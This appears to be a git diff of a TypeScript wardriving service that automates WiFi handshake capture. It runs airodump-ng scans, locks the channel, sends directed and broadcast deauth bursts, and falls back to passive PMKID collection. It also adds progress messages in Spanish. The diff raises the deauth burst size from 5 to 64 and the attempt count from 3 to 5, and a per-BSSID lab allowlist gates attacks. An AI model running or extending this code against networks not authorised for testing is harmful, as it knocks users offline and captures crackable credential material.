@@ -12,8 +12,10 @@ import { discoverTargets } from "./discovery";
 import {
   WardriveStatus,
   WardriveMode,
+  WardriveTarget,
   WardriveTargetStatus,
   WardriveDeviceView,
+  AttackStep,
 } from "./types";
 import { registerShutdownHook } from "../device/display";
 import { unloadModel } from "../cloud-api/local/ollama-llm";
@@ -25,10 +27,10 @@ import { unloadModel } from "../cloud-api/local/ollama-llm";
 // only; no code path mass-authorizes "all discovered networks".
 const PMKID_TIMEOUT_MS = 45_000;
 const PMKID_POLL_MS = 3_000;
-const DEAUTH_SETTLE_MS = 18_000; // client reassociation window after the burst
-const DEAUTH_BURST = 5; // directed, short bursts — never the 100+ style
-const DEAUTH_MAX_ATTEMPTS = 3;
-const PMKID_PASSIVE_MS = 25_000; // extra passive window after deauth fails
+const DEAUTH_SETTLE_MS = 12_000; // client reassociation window after the burst
+const DEAUTH_BURST = 64; // directed, strong burst — aireplay sends this many per client
+const DEAUTH_MAX_ATTEMPTS = 5;
+const PMKID_PASSIVE_MS = 20_000; // extra passive window after deauth fails
 const BETWEEN_TARGETS_MS = 1_500;
 
 function sanitizeBssid(raw: string): string {
@@ -79,15 +81,17 @@ export class WardriveService extends EventEmitter {
   // here so the UI can show "deauthing" and duplicate requests are ignored.
   private deauthAllowlist = new Set<string>();
   private deauthRunnerByMac = new Map<string, DeauthRunner>();
+  private discoveredTargets: WardriveTarget[] = [];
+
+  getSession(): WardriveSession | null {
+    return this.session;
+  }
 
   getStatus(): WardriveStatus {
-    const discovered =
-      this.mode === "inactive"
-        ? []
-        : discoverTargets().map((t: WardriveTargetShape) => ({
-            ...t,
-            inAllowlist: this.allowlist.has(t.bssid),
-          }));
+    const discovered = this.discoveredTargets.map((t) => ({
+      ...t,
+      inAllowlist: this.allowlist.has(t.bssid),
+    }));
     return {
       mode: this.mode,
       modelsUnloaded: this.modelsUnloaded,
@@ -116,6 +120,16 @@ export class WardriveService extends EventEmitter {
       targets: discovered,
       allowlist: [...this.allowlist],
     };
+  }
+
+  // Refresh the target list: WiFi Radar if running, otherwise iw scan.
+  // Called by the web admin on a timer while wardriving is active.
+  async refreshTargets(): Promise<void> {
+    if (this.mode === "inactive") {
+      this.discoveredTargets = [];
+      return;
+    }
+    this.discoveredTargets = await discoverTargets();
   }
 
   private targetFiles(bssid: string): string[] {
@@ -328,6 +342,8 @@ export class WardriveService extends EventEmitter {
       this.error = "";
       this.mode = "ready";
       this.session = new WardriveSession();
+      // Initial target scan so the web UI has something to show immediately.
+      void this.refreshTargets();
       console.log(`[wardrive] mode ON (iface=${info.iface}, session=${this.session.id})`);
       this.broadcastStatus();
       void unloadLlmMemory().then((ok) => {
@@ -381,7 +397,7 @@ export class WardriveService extends EventEmitter {
     if (!this.isAllowlisted(bssid)) {
       return { ok: false, error: "BSSID no autorizado — agrégalo a los objetivos del lab primero" };
     }
-    const target = discoverTargets().find((t) => t.bssid === bssid);
+    const target = (await discoverTargets()).find((t: WardriveTarget) => t.bssid === bssid);
     if (!target) return { ok: false, error: "El objetivo no está visible en el aire ahora" };
 
     this.attackAbort = false;
@@ -412,10 +428,11 @@ export class WardriveService extends EventEmitter {
     this.attackAbort = false;
     this.mode = "attacking";
     this.broadcastStatus();
+    const targets = await discoverTargets();
     for (const bssid of bssids) {
       if (this.attackAbort) break;
       if (this.targetMeta.get(bssid)?.status === "captured") continue;
-      const target = discoverTargets().find((t) => t.bssid === bssid);
+      const target = targets.find((t: WardriveTarget) => t.bssid === bssid);
       if (!target) {
         this.updateMeta(bssid, { status: "failed", error: "ya no visible" });
         continue;
@@ -481,6 +498,21 @@ export class WardriveService extends EventEmitter {
     });
   }
 
+  // Emit a progress event for the UI stepper: what step we're on, a human
+  // explanation, and optionally the command + its output.
+  private progress(bssid: string, step: AttackStep, message: string, command?: string, output?: string): void {
+    this.emit("attack-progress", {
+      type: "attack-progress" as const,
+      bssid,
+      step,
+      message,
+      command,
+      output,
+    });
+    // Also persist to session for reconnection.
+    this.session?.addProgress(bssid, step, message, command, output);
+  }
+
   // Full attack cycle against one BSSID: PMKID first (silent, no client
   // needed), then directed deauth bursts with settle windows. First method
   // to produce EAPOL/PMKID wins; everything lands in the session folder.
@@ -512,44 +544,63 @@ export class WardriveService extends EventEmitter {
       }
     }
 
-    // Resolve the target's REAL channel (and seed clients) from the air — the
-    // radar's channel can be a hopping-capture artifact and locking the wrong
-    // channel captures nothing.
+    // Step 1: Resolve the target's REAL channel (and seed clients) from the air
+    this.progress(bssid, "scan", `Escaneando ${ssid || bssid} para detectar canal real y clientes...`,
+      `airodump-ng --bssid ${bssid} -w ${prefix}-scan --output-format csv ${this.iface}`);
     let realChannel = channel;
     let seedClients: string[] = [];
     try {
       const scan = await scanTarget(this.iface, bssid, `${prefix}-scan`, 9);
       if (scan.channel && scan.channel > 0) {
         if (scan.channel !== channel) {
+          this.progress(bssid, "scan", `Canal real detectado: ${scan.channel} (radar decía ${channel})`);
           this.appendLog(bssid, `[capture] canal real ${scan.channel} (el radar reportaba ${channel})`);
         }
         realChannel = scan.channel;
       }
       seedClients = scan.clients;
+      if (seedClients.length > 0) {
+        this.progress(bssid, "scan", `Clientes detectados: ${seedClients.length} (${seedClients.slice(0, 2).join(", ")}${seedClients.length > 2 ? "..." : ""})`);
+      } else {
+        this.progress(bssid, "scan", "Sin clientes asociados detectados");
+      }
       this.updateMeta(bssid, { channel: realChannel });
     } catch {
-      /* keep the radar channel */
+      this.progress(bssid, "scan", "Escaneo falló, usando canal del radar");
     }
     if (this.attackAbort) {
       this.updateMeta(bssid, { status: "cancelled" });
       return;
     }
 
+    // Step 2: Lock radio to the target channel
+    this.progress(bssid, "lock", `Fijando adaptador en canal ${realChannel}...`,
+      `iw dev ${this.iface} set channel ${realChannel}`);
     try {
       await setChannel(this.iface, realChannel);
+      this.progress(bssid, "lock", `Canal ${realChannel} fijado correctamente`);
     } catch (err: any) {
+      this.progress(bssid, "lock", `Error al fijar canal: ${err?.message || err}`);
       this.updateMeta(bssid, { status: "failed", error: `setChannel: ${err?.message || err}` });
       return;
     }
 
+    // Step 3: Start airodump capture
+    this.progress(bssid, "capture", `Iniciando captura de tráfico...`,
+      `airodump-ng --bssid ${bssid} -c ${realChannel} -w ${prefix} ${this.iface}`);
     const capturer = new AirodumpCapture(this.iface, bssid, realChannel, prefix);
     this.captureRunner = capturer;
-    capturer.on("log", (line: string) => this.appendLog(bssid, `[airodump] ${line}`));
+    capturer.on("log", (line: string) => {
+      this.appendLog(bssid, `[airodump] ${line}`);
+      this.progress(bssid, "capture", `Capturando: ${line.slice(0, 80)}...`, undefined, line);
+    });
     this.appendLog(bssid, `[capture] airodump-ng on ${this.iface} ch${realChannel} targeting ${bssid}`);
     capturer.start();
     const capFile = capturer.capPath();
+    this.progress(bssid, "capture", "Captura activa, esperando clientes...");
 
     let captured = false;
+    let consecutiveZeroClients = 0;
     try {
       // Let airodump create its files and enumerate associated clients.
       await sleep(4_000);
@@ -561,15 +612,31 @@ export class WardriveService extends EventEmitter {
         // to a broadcast burst.
         let clients = [...new Set([...capturer.associatedClients(), ...seedClients])];
         if (clients.length === 0) {
+          consecutiveZeroClients++;
           const c = this.pickClientFor(bssid);
           if (c) clients = [c];
+        } else {
+          consecutiveZeroClients = 0;
         }
+        // If we've had 3 attempts with no clients detected, extend the wait.
+        const settleMs = clients.length === 0 ? DEAUTH_SETTLE_MS * 2 : DEAUTH_SETTLE_MS;
+        this.progress(bssid, "deauth", `Intento ${attempt}/${DEAUTH_MAX_ATTEMPTS}: deauth a ${clients.length} cliente(s)...`)
+        ;
         for (const client of clients) {
           if (this.attackAbort) break;
           await this.fireDeauth(bssid, client, attempt);
         }
         if (!this.attackAbort) await this.fireDeauth(bssid, null, attempt); // broadcast too
-        captured = await this.waitForCapture(bssid, capFile, DEAUTH_SETTLE_MS);
+        this.progress(bssid, "validate", `Esperando handshake de reconexión...${clients.length === 0 ? " (sin clientes detectados, esperando más tiempo)" : ""}`);
+        captured = await this.waitForCapture(bssid, capFile, settleMs);
+        if (captured) {
+          this.progress(bssid, "validate", "¡Handshake capturado!");
+          break;
+        }
+        // Brief pause between attempts.
+        if (attempt < DEAUTH_MAX_ATTEMPTS && !captured) {
+          await sleep(2000);
+        }
       }
     } finally {
       capturer.stop();
@@ -582,20 +649,33 @@ export class WardriveService extends EventEmitter {
     }
     if (captured) {
       this.markCaptured(bssid, "deauth", capFile);
+      this.progress(bssid, "done", "Handshake WPA2 capturado correctamente", undefined, capFile);
       return;
     }
 
     // PMKID fallback: if deauth didn't produce a handshake, keep the locked
     // capture running and wait for a passive PMKID frame (WPA3/SAE networks
     // don't do 4-way handshakes but still emit PMKID on client connect).
+    this.progress(bssid, "validate", "Deauth no funcionó, intentando PMKID pasivo...");
     this.appendLog(bssid, `[pmkid] passive fallback window ${PMKID_PASSIVE_MS / 1000}s`);
     this.updateMeta(bssid, { method: "pmkid" });
     captured = await this.waitForCapture(bssid, capFile, PMKID_PASSIVE_MS);
     if (captured) {
       this.markCaptured(bssid, "pmkid", capFile);
+      this.progress(bssid, "done", "PMKID capturado correctamente", undefined, capFile);
       return;
     }
 
+    // Final validation: if hcxpcapngtool found EAPOL/PMKID at any point,
+    // the capture is valid even if the timing above missed it.
+    const finalCheck = await this.session!.convertCapture(capFile);
+    if (finalCheck.hasCapture) {
+      this.markCaptured(bssid, "deauth", capFile);
+      this.progress(bssid, "done", "Handshake capturado (validación final)", undefined, capFile);
+      return;
+    }
+
+    this.progress(bssid, "done", "No se pudo capturar handshake ni PMKID");
     this.updateMeta(bssid, {
       status: "failed",
       error: "sin handshake ni PMKID — el objetivo puede ser WPA3/SAE puro o sin clientes",
@@ -734,8 +814,6 @@ export class WardriveService extends EventEmitter {
     });
   }
 }
-
-type WardriveTargetShape = ReturnType<typeof discoverTargets>[number];
 
 function sleep(ms: number): Promise<void> {
   return new Promise((resolve) => setTimeout(resolve, ms));
